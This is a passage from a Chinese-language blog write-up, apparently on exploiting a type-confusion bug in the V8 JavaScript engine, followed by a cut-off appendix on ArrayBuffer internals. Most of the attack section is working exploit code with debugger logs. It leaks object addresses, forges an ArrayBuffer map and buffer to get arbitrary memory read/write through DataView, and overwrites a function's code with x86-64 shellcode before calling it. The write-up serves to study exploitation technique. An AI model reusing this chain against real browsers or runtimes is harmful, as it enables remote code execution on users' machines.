ab的prototype地址，且由于prototype和constructor的地址偏移是固定的，所以可以去通过prototype的地址去计算出constructor的地址，然后将他们写入我们要fake的map对应的位置。<br>不过也可以直接用<code>ab.__proto__.constructor</code>得到constructor的地址。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ab=<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="comment">// print("float is " + (new Int64(0x001900c60f00000a)).asDouble().toString());</span></span><br><span class="line"><span class="comment">// print("float is " + (new Int64(0x00000000082003ff)).asDouble().toString());</span></span><br><span class="line"></span><br><span class="line">arr0=[<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];</span><br><span class="line"><span class="comment">// leak arraybuffer的prototype和constructor</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read_obj_addr</span>(<span class="params">object</span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">evil_r0</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        arr0[<span class="number">0</span>] = object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        trigger(arr0, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    re=Int64.fromDouble(trigger(arr0,evil_r0));</span><br><span class="line">    <span class="keyword">return</span> re;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ab_proto_addr=<span class="built_in">parseInt</span>(read_obj_addr(ab.__proto__));</span><br><span class="line">print(<span class="string">"要被leak的ArrayBuffer"</span>);</span><br><span class="line">%DebugPrint(ab);</span><br><span class="line">print(ab_proto_addr.toString(<span class="number">16</span>));</span><br><span class="line">ab_constructor_addr = ab_proto_addr - <span class="number">0x1b0</span>;</span><br><span class="line">print(ab_constructor_addr.toString(<span class="number">16</span>));</span><br></pre></td></tr></table></figure><p>log</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">要被leak的ArrayBuffer</span><br><span class="line">DebugPrint: 0x130c771022d9: [JSArrayBuffer]</span><br><span class="line"> - map &#x3D; 0x228d52a02f71 [FastProperties]</span><br><span class="line">...</span><br><span class="line">0x228d52a02f71: [Map]</span><br><span class="line"> - type: JS_ARRAY_BUFFER_TYPE</span><br><span class="line">...</span><br><span class="line"> - prototype: 0x34f96880b7b9 &lt;Object map &#x3D; 0x228d52a02fc1&gt;</span><br><span class="line"> - constructor: 0x34f96880b609 &lt;JSFunction ArrayBuffer (sfi &#x3D; 0x157dbc033711)&gt;</span><br><span class="line"> ...</span><br><span class="line"> ...</span><br><span class="line">34f96880b7b9</span><br><span class="line">34f96880b609</span><br></pre></td></tr></table></figure><h3 id="fake-map并leak出来"><a href="#fake-map并leak出来" class="headerlink" title="fake map并leak出来"></a>fake map并leak出来</h3><p>前后两次gc()，让ab_map_obj这个double array移动到old space里，并且让其和它的elements地址偏移恒定。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">gc();</span><br><span class="line">gc();</span><br><span class="line"><span class="keyword">var</span> ab_map_obj = [</span><br><span class="line">    <span class="number">-1.1263976280432204e+129</span>,   <span class="comment">//0xdaba0000daba0000，写死即可，这个数字应该无所谓</span></span><br><span class="line">    <span class="number">3.477098183419809e-308</span>,     <span class="comment">//这里是固定的标志位，直接打印一个ArrayBuffer，把对应于map这个位置的标志位用对应的double number写进去即可</span></span><br><span class="line">    <span class="number">6.73490047e-316</span>,            <span class="comment">//这里是固定的标志位，直接打印一个ArrayBuffer，把对应于map这个位置的标志位用对应的double number写进去即可</span></span><br><span class="line">    <span class="number">-1.1263976280432204e+129</span>,   <span class="comment">// use prototype replace it</span></span><br><span class="line">    <span class="number">-1.1263976280432204e+129</span>,   <span class="comment">// use constructor replace it</span></span><br><span class="line">    <span class="number">0.0</span></span><br><span class="line">];</span><br><span class="line">gc();</span><br><span class="line">gc();</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">DebugPrint: 0x3e0338a149e9: [JSArray] in OldSpace</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"> - elements &#x3D; 0x3e0338a14a49 &lt;FixedDoubleArray[6]&gt; &#123;</span><br><span class="line">           0: -1.1264e+129</span><br><span class="line">           1: 3.4771e-308</span><br><span class="line">           2: 6.7349e-316</span><br><span class="line">         3-4: -1.1264e+129</span><br><span class="line">           5: 0</span><br><span class="line"> &#125;</span><br><span class="line">我们要fake的map在elements里，而elements的前面0x10分别是map和length，所以</span><br><span class="line">0x3e0338a14a49 + 0x10 -0x3e0338a149e9 &#x3D; 0x70</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">gdb-peda$ x&#x2F;20gx 0x3e0338a14a49-1</span><br><span class="line">0x3e0338a14a48:0x000037d6d7302de10x0000000600000000</span><br><span class="line">0x3e0338a14a58:0xdaba0000daba00000x001900c60f00000a</span><br><span class="line">0x3e0338a14a68:0x00000000082003ff0xdaba0000daba0000</span><br><span class="line">0x3e0338a14a78:0xdaba0000daba00000x0000000000000000</span><br><span class="line">0x3e0338a14a88:0x000037d6d73022010x0006b57800000000</span><br></pre></td></tr></table></figure><p>然后将其ab_map_obj的地址leak出来，加上0x70就是我们fake的map的地址。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">"要leak出ab_map_obj的数组"</span>);</span><br><span class="line">%DebugPrint(ab_map_obj);</span><br><span class="line"><span class="comment">// leak ab_map_obj的地址</span></span><br><span class="line"></span><br><span class="line">arr1=[<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read_obj_addr1</span>(<span class="params">object</span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">evil_r1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        arr1[<span class="number">0</span>] = object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        trigger(arr1, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    re=Int64.fromDouble(trigger(arr1,evil_r1));</span><br><span class="line">    <span class="comment">// while(1);</span></span><br><span class="line">    <span class="keyword">return</span> re;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ab_map_obj_addr = <span class="built_in">parseInt</span>(read_obj_addr1(ab_map_obj))+<span class="number">0x70</span>;</span><br><span class="line">print(ab_map_obj_addr.toString(<span class="number">16</span>));</span><br><span class="line">ab_map_obj_addr = <span class="keyword">new</span> Int64(ab_map_obj_addr).asDouble();</span><br></pre></td></tr></table></figure><p>这里顺便说一句，无论是leak还是fake的时候，得到的都是double，写入的也是按照double写入，这个调试一下就知道了。</p><h3 id="fake-ArrayBuffer并leak出来"><a href="#fake-ArrayBuffer并leak出来" class="headerlink" title="fake ArrayBuffer并leak出来"></a>fake ArrayBuffer并leak出来</h3><p>在map被fake好了之后，我们就可以fake ArrayBuffer得到任意地址读写的原语了。<br>依然是前后两次gc()，然后fake一个ArrayBuffer结构。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">gc();</span><br><span class="line">gc();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_ab = [</span><br><span class="line">    ab_map_obj_addr, <span class="comment">//我们fake的map地址</span></span><br><span class="line">    ab_map_obj_addr, <span class="comment">//写死即可，这个数字应该无所谓</span></span><br><span class="line">    ab_map_obj_addr, <span class="comment">//写死即可，这个数字应该无所谓</span></span><br><span class="line">    <span class="number">3.4766779039175e-310</span>, <span class="comment">/* buffer length 0x4000*/</span></span><br><span class="line">    <span class="number">3.477098183419809e-308</span>,<span class="comment">//backing store,先随便填一个数</span></span><br><span class="line">    <span class="number">3.477098183419809e-308</span> <span class="comment">//写死即可，这个数字应该无所谓</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">gc();</span><br><span class="line">gc();</span><br></pre></td></tr></table></figure><p>然后将这个fake好的ArrayBuffer的地址leak出来，依然是先leak fake_ab这个JSArray的地址，然后根据偏移0x70找到我们在elements里fake的ArrayBuffer的地址。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">arr2=[<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read_obj_addr2</span>(<span class="params">object</span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">evil_r2</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        arr2[<span class="number">0</span>] = object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        trigger(arr2, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    re=Int64.fromDouble(trigger(arr2,evil_r2));</span><br><span class="line">    <span class="keyword">return</span> re;</span><br><span class="line">&#125;</span><br><span class="line">print(<span class="string">"要leak出的fake_ab的数组"</span>);</span><br><span class="line">%DebugPrint(fake_ab);</span><br><span class="line">fake_ab_float_addr=<span class="built_in">parseInt</span>(read_obj_addr2(fake_ab))+<span class="number">0x70</span>;</span><br><span class="line">print(fake_ab_float_addr.toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line">fake_ab_float_addr=<span class="keyword">new</span> Int64(fake_ab_float_addr).asDouble();</span><br></pre></td></tr></table></figure><p>log</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">leak出的map地址是810f1c94a01</span><br><span class="line"></span><br><span class="line">要leak出的fake_ab的数组</span><br><span class="line">DebugPrint: 0x810f1c96e29: [JSArray] in OldSpace</span><br><span class="line"> ...</span><br><span class="line"> ...</span><br><span class="line"> - elements &#x3D; 0x810f1c96e89 &lt;FixedDoubleArray[6]&gt; &#123;</span><br><span class="line">         0-2: 4.3818e-311</span><br><span class="line">           3: 3.47668e-310</span><br><span class="line">         4-5: 3.4771e-308</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">810f1c96e99</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">gdb-peda$ x&#x2F;20gx 0x810f1c96e89-1</span><br><span class="line">0x810f1c96e88:0x0000361a14882de1--&gt;fixedArray真正的map 0x0000000600000000--&gt;fixedArray的length</span><br><span class="line">下面才是我们fake的ArrayBuffer</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">0x810f1c96e98:0x00000810f1c94a01--&gt;fake map0x00000810f1c94a01--&gt;随便</span><br><span class="line">0x810f1c96ea8:0x00000810f1c94a01--&gt;随便0x0000400000000000--&gt;length</span><br><span class="line">0x810f1c96eb8:0x001900c60f00000a--&gt;backingstore0x001900c60f00000a--&gt;随便</span><br><span class="line">0x810f1c96ec8:0x0000361a148822010x0006913800000000</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">0x810f1c96e89+0x10-0x810f1c96e29&#x3D;0x70</span><br></pre></td></tr></table></figure><h3 id="将我们fake的ArrayBuffer当成一个JSObject读出来"><a href="#将我们fake的ArrayBuffer当成一个JSObject读出来" class="headerlink" title="将我们fake的ArrayBuffer当成一个JSObject读出来"></a>将我们fake的ArrayBuffer当成一个JSObject读出来</h3><p>我们可以在callback里改掉array的类型，比如将一个double array改成了object array，但是由于type confusion，我们在第二次对arr[0]重新写入值的时候，依然把arr当成一个double array，并将其写入。<br>这样实际上，我们把一个double的数值当成一个object指针写入。</p><p>如下，写入之后，arrr[0]将由于我们fake的arraybuffer的map，被视作一个arraybuffer对待，于是可以用它来初始化一个DataView。</p><p>DataView就可以操作这个fake的ArrayBuffer的BackingStore地址对应的内存。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">arrr=[<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write_obj_addr</span>(<span class="params">object</span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">evil_w0</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        arrr[<span class="number">0</span>] = &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        trigger2(arrr, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;,<span class="number">1.1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    trigger2(arrr,evil_w0,fake_ab_float_addr);</span><br><span class="line">&#125;</span><br><span class="line">write_obj_addr(fake_ab_float_addr);</span><br><span class="line"><span class="comment">//DataView(ArrayBuffer buffer [, 字节起始位置 [, 长度]]);</span></span><br><span class="line">fake_dv = <span class="keyword">new</span> <span class="built_in">DataView</span>(arrr[<span class="number">0</span>],<span class="number">0</span>,<span class="number">0x4000</span>);</span><br><span class="line">%DebugPrint(fake_dv);</span><br></pre></td></tr></table></figure><h3 id="leak一个function的code指针的地址，并将其写入fake-ArrayBuffer的BackingStore"><a href="#leak一个function的code指针的地址，并将其写入fake-ArrayBuffer的BackingStore" class="headerlink" title="leak一个function的code指针的地址，并将其写入fake ArrayBuffer的BackingStore"></a>leak一个function的code指针的地址，并将其写入fake ArrayBuffer的BackingStore</h3><p>由此，我们就可以读取对应于code指针所在地址的code指针的值。<br>如下图log，我需要得到code的地址，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ job 0xac9a5c986c9</span><br><span class="line">0xac9a5c986c9: [Function] in OldSpace</span><br><span class="line"> - map &#x3D; 0x3a6b959824d1 [FastProperties]</span><br><span class="line"> - prototype &#x3D; 0x2e1993f04669</span><br><span class="line"> - elements &#x3D; 0x21df6cd02251 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - initial_map &#x3D; </span><br><span class="line"> - shared_info &#x3D; 0x2e1993f3ceb9 &lt;SharedFunctionInfo&gt;</span><br><span class="line"> - name &#x3D; 0x21df6cd02441 &lt;String[0]: &gt;</span><br><span class="line"> - formal_parameter_count &#x3D; 0</span><br><span class="line"> - kind &#x3D; [ NormalFunction ]</span><br><span class="line"> - context &#x3D; 0x2e1993f03d91 &lt;FixedArray[281]&gt;</span><br><span class="line"> - code &#x3D; 0x19d27c522f01 &lt;Code BUILTIN&gt;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">gdb-peda$ x&#x2F;20gx 0xac9a5c986c9-1</span><br><span class="line">0xac9a5c986c8:0x00003a6b959824d10x000021df6cd02251</span><br><span class="line">0xac9a5c986d8:0x000021df6cd022510x000021df6cd02321</span><br><span class="line">0xac9a5c986e8:0x00002e1993f3ceb90x00002e1993f03d91</span><br><span class="line">0xac9a5c986f8:0x00002e1993f3d0910x000019d27c522f01--&gt;code</span><br></pre></td></tr></table></figure><p>从图中可以看出来，就是function-1（这个减一是因为v8中指针末位都置为1，需要去掉）+0x38，我们把它leak出来。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">gc();</span><br><span class="line">gc();</span><br><span class="line"><span class="keyword">var</span> evil_f = <span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">"var a = 1000000"</span>);</span><br><span class="line">gc();</span><br><span class="line">gc();</span><br><span class="line"></span><br><span class="line">print(<span class="string">"要read的function"</span>);</span><br><span class="line">%DebugPrint(evil_f);</span><br><span class="line">arr3=[<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read_obj_addr3</span>(<span class="params">object</span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">evil_r3</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        arr3[<span class="number">0</span>] = object;</span><br><span class="line">        %DebugPrint(arr3);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        trigger(arr3, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    re=Int64.fromDouble(trigger(arr3,evil_r3));</span><br><span class="line">    <span class="keyword">return</span> re;</span><br><span class="line">&#125;</span><br><span class="line">shellcode_address_ref=<span class="built_in">parseInt</span>(read_obj_addr3(evil_f))+<span class="number">0x38</span><span class="number">-1</span>;</span><br><span class="line">print(shellcode_address_ref.toString(<span class="number">16</span>));</span><br></pre></td></tr></table></figure><p>所以找到这个地址后，我们将其写入fake arraybuffer的backingstore，就能用dataview把这个地址对应的数据读出来。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fake_dv = <span class="keyword">new</span> <span class="built_in">DataView</span>(arrr[<span class="number">0</span>],<span class="number">0</span>,<span class="number">0x4000</span>);</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">shellcode_address =  fake_dv.getFloat64(<span class="number">0</span>,<span class="literal">true</span>);</span><br><span class="line">print(Int64.fromDouble(shellcode_address).toString(<span class="number">16</span>));</span><br></pre></td></tr></table></figure><p>但是这个地址，并不是真正的函数对应的执行的代码的入口，它还需要加上0x5f，如图：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ job 0x19d27c522f01</span><br><span class="line">0x19d27c522f01: [Code]</span><br><span class="line">kind &#x3D; BUILTIN</span><br><span class="line">name &#x3D; InterpreterEntryTrampoline</span><br><span class="line">compiler &#x3D; unknown</span><br><span class="line">Instructions (size &#x3D; 1170)</span><br><span class="line">0x19d27c522f60--&gt;从这开始     0  488b5f2f       REX.W movq rbx,[rdi+0x2f]</span><br><span class="line">0x19d27c522f64     4  488b5b07       REX.W movq rbx,[rbx+0x7]</span><br><span class="line">0x19d27c522f68     8  488b4b0f       REX.W movq rcx,[rbx+0xf]</span><br><span class="line">0x19d27c522f6c     c  f6c101         testb rcx,0x1</span><br><span class="line">0x19d27c522f6f     f  0f8512020000   jnz 0x19d27c523187  (InterpreterEntryTrampoline)</span><br><span class="line">0x19d27c522f75    15  f6c101         testb rcx,0x1</span><br><span class="line">0x19d27c522f78    18  7410           jz 0x19d27c522f8a  (InterpreterEntryTrampoline)</span><br><span class="line">0x19d27c522f7a    1a  48ba000000003d000000 REX.W movq rdx,0x3d00000000</span><br><span class="line">0x19d27c522f84    24  e857350200     call 0x19d27c5464e0  (Abort)    ;; code: BUILTIN</span><br><span class="line">0x19d27c522f89    29  cc             int3l</span><br><span class="line">0x19d27c522f8a    2a  4885c9         REX.W testq rcx,rcx</span><br><span class="line">0x19d27c522f8d    2d  0f842c030000   jz 0x19d27c5232bf  (InterpreterEntryTrampoline)</span><br><span class="line">0x19d27c522f93    33  f6c101         testb rcx,0x1</span><br><span class="line">0x19d27c522f96    36  7410           jz 0x19d27c522fa8  (InterpreterEntryTrampoline)</span><br><span class="line">0x19d27c522f98    38  48ba000000003d000000 REX.W movq rdx,0x3d00000000</span><br></pre></td></tr></table></figure><p>于是我们还要再加上0x5f</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shellcode_address=shellcode_address+<span class="keyword">new</span> Int64(<span class="number">0x5f</span>).asDouble();</span><br><span class="line">print(Int64.fromDouble(shellcode_address).toString(<span class="number">16</span>));</span><br></pre></td></tr></table></figure><h3 id="向函数要执行的代码的地址，写入我们的shellcode"><a href="#向函数要执行的代码的地址，写入我们的shellcode" class="headerlink" title="向函数要执行的代码的地址，写入我们的shellcode"></a>向函数要执行的代码的地址，写入我们的shellcode</h3><p>同上，将函数要执行的代码的地址写入到BackingStore，并用dataview向这个地址写入shellcode。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">fake_ab[<span class="number">4</span>]=shellcode_address;</span><br><span class="line">fake_ab[<span class="number">5</span>]=shellcode_address;</span><br><span class="line">%DebugPrint(fake_ab);</span><br><span class="line"><span class="comment">// while(1);</span></span><br><span class="line"><span class="keyword">var</span> shellcode=[<span class="number">0x90909090</span>,<span class="number">0x90909090</span>,<span class="number">0x782fb848</span>,<span class="number">0x636c6163</span>,<span class="number">0x48500000</span>,<span class="number">0x73752fb8</span>,<span class="number">0x69622f72</span>,<span class="number">0x8948506e</span>,<span class="number">0xc03148e7</span>,<span class="number">0x89485750</span>,<span class="number">0xd23148e6</span>,<span class="number">0x3ac0c748</span>,<span class="number">0x50000030</span>,<span class="number">0x4944b848</span>,<span class="number">0x414c5053</span>,<span class="number">0x48503d59</span>,<span class="number">0x3148e289</span>,<span class="number">0x485250c0</span>,<span class="number">0xc748e289</span>,<span class="number">0x00003bc0</span>,<span class="number">0x050f00</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; shellcode.length;i++)&#123;</span><br><span class="line"><span class="keyword">var</span> value = shellcode[i];</span><br><span class="line">fake_dv.setUint32(i * <span class="number">4</span>,value,<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">print(<span class="string">"go to shellcode!"</span>);</span><br><span class="line">evil_f();</span><br></pre></td></tr></table></figure><h3 id="exploit-1"><a href="#exploit-1" class="headerlink" title="exploit"></a>exploit</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-10-09-051114.png" alt=""></p><h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h2><h3 id="JSArrayBuffer"><a href="#JSArrayBuffer" class="headerlink" title="JSArrayBuffer"></a>JSArrayBuffer</h3><h4 id="ArrayBuffer-and-TypedArray"><a href="#ArrayBuffer-and-TypedArray" class="headerlink" title="ArrayBuffer and TypedArray"></a>ArrayBuffer and TypedArray</h4><ul><li>Originally ArrayBuffer<ul><li>一个可以直接从JavaScript访问内存的特殊数组<ul><li>但是，ArrayBuffer仅准备一个buffer</li><li>BackingStore——可以使用TypedArray/DataView，指定的类型读取和写入该区域，例如作为原始数据数组访问的8位或32位内存<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-14-151055.png" alt=""></li><li>为了实际访问，有必要一起使用TypedArray或DataView<br>  <img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-14-151829.png" alt=""></li></ul></li><li>使用例子 (TypedArray版本)<ul><li>创建方法1，仅指定长度，初始化为零<br>t_arr = new Uint8Array(128) //ArrayBuffer被创建在内部</li><li>创建方法2，使用特定值初始化<br>t_arr = new Uint8Array([4,3,2,1,0]) //ArrayBuffer被创建在内部</li><li>创建方法3，事先构建缓冲区并使用它<br>arr_buf = new ArrayBuffer(8);<br>t_arr1 = new Uint16Array(arr_buf); //创建一个Uint16数组<br>t_arr2 = new Uint16Array(arr_buf, 0, 4); //或者，您也可以指定数组的开始和结束位置</li></ul></li><li>ArrayBuffer可以在不同的TypedArray之间共享<ul><li>它也可以用于double和int的类型转换<ul><li><strong>类型转换的意义在于改变字节序列的解释，而不是转换</strong></li><li>就像C语言的Union</li></ul></li><li>BackingStore——可以使用TypedArray指定的类型读取和写入该区域，例如作为原始数据数组访问的8位或32位内存<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-14-153219.png" alt=""></li><li>①预先准备ArrayBuffer<br>var ab = new 